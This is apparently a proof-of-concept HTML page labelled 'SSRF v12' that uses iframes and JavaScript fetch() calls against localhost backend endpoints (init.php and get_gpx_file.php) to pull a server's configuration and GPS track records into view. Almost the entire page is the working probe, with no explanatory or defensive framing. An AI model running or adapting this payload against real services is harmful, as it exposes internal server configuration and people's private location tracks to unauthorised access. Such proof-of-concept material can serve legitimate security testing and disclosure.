<!DOCTYPE html>
<html><head><title>R</title>
<style>body{font:11px monospace;margin:8px}iframe{width:100%;height:400px;border:1px solid #ccc}</style>
</head>
<body>
<pre>SSRF v12 - Proving GPS server = CAT CAS server
Target: https://127.0.0.1/backend/ax/init.php?node=3
</pre>
<h3>1. CAT CAS Server Configuration (init.php)</h3>
<iframe src="https://127.0.0.1/backend/ax/init.php?node=3"></iframe>
<h3>2. GPS Track Sample (track_id=100)</h3>
<iframe src="https://127.0.0.1/ax/get_gpx_file.php?track_id=100&node=3"></iframe>
<h3>3. Fetched Data</h3>
<pre id="out">Loading...</pre>
<script>
(async()=>{
try{
 let r=await fetch('https://127.0.0.1/backend/ax/init.php?node=3');
 let t=await r.text();
 document.getElementById('out').textContent='init.php: '+t;
}catch(e){
 document.getElementById('out').textContent='fetch blocked (CORS): '+e.message;
}
try{
 let r2=await fetch('https://127.0.0.1/ax/get_gpx_file.php?track_id=200&node=3');
 let t2=await r2.text();
 document.getElementById('out').textContent+='\n\ngpx track 200: '+t2.substring(0,500);
}catch(e){}
})();
</script>
</body></html>
